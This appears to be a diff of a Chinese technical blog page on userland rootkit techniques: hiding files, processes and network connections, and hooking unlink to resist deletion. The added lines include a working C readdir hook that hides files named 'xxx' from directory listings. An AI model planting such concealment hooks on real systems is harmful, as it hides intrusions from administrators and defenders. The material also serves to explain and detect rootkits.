@@ -185,8 +185,31 @@ Hello,<span class="w"> </span>World!
 <p>文件隐藏</p>
 <div class="highlight"><pre><span></span><code>HOOK open、opendir、readdir等函数， 隐藏特定文件名
 </code></pre></div>
+<p>这段代码hook 了 readdir 函数，并在每次调用时检查当前目录项的名称。如果名称匹配要隐藏的文件（如 "xxx"），则跳过该目录项并继续读取下一个</p>
+<div class="highlight"><pre><span></span><code>struct<span class="w"> </span>dirent<span class="w"> </span>*readdir<span class="o">(</span>DIR<span class="w"> </span>*dirp<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!original_readdir<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="nv">original_readdir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>struct<span class="w"> </span>dirent*<span class="w"> </span><span class="o">(</span>*<span class="o">)(</span>DIR*<span class="o">))</span><span class="w"> </span>dlsym<span class="o">(</span>RTLD_NEXT,<span class="w"> </span><span class="s2">"readdir"</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>const<span class="w"> </span>char<span class="w"> </span>*error_msg<span class="w"> </span><span class="o">=</span><span class="w"> </span>dlerror<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>error_msg<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>fprintf<span class="o">(</span>stderr,<span class="w"> </span><span class="s2">"dlsym error: %s\n"</span>,<span class="w"> </span>error_msg<span class="o">)</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>NULL<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+
+<span class="w">    </span>struct<span class="w"> </span>dirent<span class="w"> </span>*entry<span class="p">;</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="o">((</span><span class="nv">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>original_readdir<span class="o">(</span>dirp<span class="o">))</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span>NULL<span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span>//<span class="w"> </span>过滤掉你想要隐藏的文件或目录
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>strcmp<span class="o">(</span>entry-&gt;d_name,<span class="w"> </span><span class="s2">"xxx"</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">continue</span><span class="p">;</span><span class="w">  </span>//<span class="w"> </span>跳过这些文件
+<span class="w">        </span><span class="o">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span>entry<span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>NULL<span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div>
 <p>进程隐藏</p>
-<div class="highlight"><pre><span></span><code>HOOK ps、top等命令相关的函数调用， 通常HOOK readdir、getdents函数来隐藏特定进程
+<div class="highlight"><pre><span></span><code>HOOK ps、top等命令相关的函数调用， 通常HOOK readdir函数来隐藏特定进程
 </code></pre></div>
 <p>这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：</p>
 <ul>
@@ -224,9 +247,6 @@ Hello,<span class="w"> </span>World!
 <span class="w">    </span><span class="o">}</span><span class="w">                                                                   </span>
 <span class="w">    </span><span class="k">return</span><span class="w"> </span>dir<span class="p">;</span><span class="w">                                                         </span>
 <span class="o">}</span>
-</code></pre></div>
-<p>网络连接隐藏</p>
-<div class="highlight"><pre><span></span><code>HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
 </code></pre></div>
 <p>防止被删除
     HOOK rm 命令的相关函数调用，一般会HOOK unlink函数，来避免自己被删除</p>
